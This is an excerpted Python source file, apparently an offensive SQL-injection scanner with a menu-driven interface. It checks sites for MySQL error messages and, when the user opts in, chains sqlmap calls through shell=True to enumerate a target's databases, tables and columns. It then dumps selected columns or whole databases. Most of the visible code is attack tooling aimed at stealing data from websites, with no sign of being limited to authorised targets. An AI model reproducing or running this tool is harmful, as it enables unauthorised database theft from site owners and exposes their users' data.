    ...
    try:
        async with session.get(site_sql) as response:
            ...
            if re.search(r'You have an error in your SQL syntax;', source_code):
                ...
                if exploits =='yes' or exploits =='Yes' or exploits =='Y' or exploits =='y':
                    asyncio.run(exploit(sqli_injection))
                else:
                    pass
...
def exploit(site):
    ...
    for pg in page:
        for ids in num_id:
            sqlmap_cmd = f"sqlmap -u {site}/{pg}{ids} --dbs --batch"
            subprocess.run(sqlmap_cmd, shell=True)
            db = input("\033[90m╔═══[Enter Database Name ]\n╚══>>>   \033[32m")
            sqlmap_cmd = f"sqlmap -u {site}/{pg}{ids} -D {db} --tables"
            subprocess.run(sqlmap_cmd, shell=True)
            table = input("\033[90m╔═══[Enter Table Name ]\n╚══>>>   \033[32m")
            sqlmap_cmd = f"sqlmap -u {site}/{pg}{ids} -D {db} -T {table} --columns"
            subprocess.run(sqlmap_cmd, shell=True)
            ...
            if dn.lower() == "d":
                ...
                sqlmap_cmd = f"sqlmap -u {site}/{pg}{ids} -D {db} -T {table} -C {col} --dump"
                subprocess.run(sqlmap_cmd, shell=True)
            else:
                d_all = input("\033[1;31mDo you want to download the entire database [y/n]: ")
                if d_all.lower() == "y":
                    sqlmap_cmd = f"sqlmap -u {site}/{pg}{ids} -D {db} --dump"
                    subprocess.run(sqlmap_cmd, shell=True)
...
{RED}[{RESET}3{RED}] {GREEN}ABOUT DEVELOPER    {RED}[{RESET}4{RED}] {GREEN} ABOUT SOFTWARE
        ...
        if sqli == '1':
            ...
            asyncio.run(about_developer())
        elif sqli == '4':
            asyncio.run(about_software())
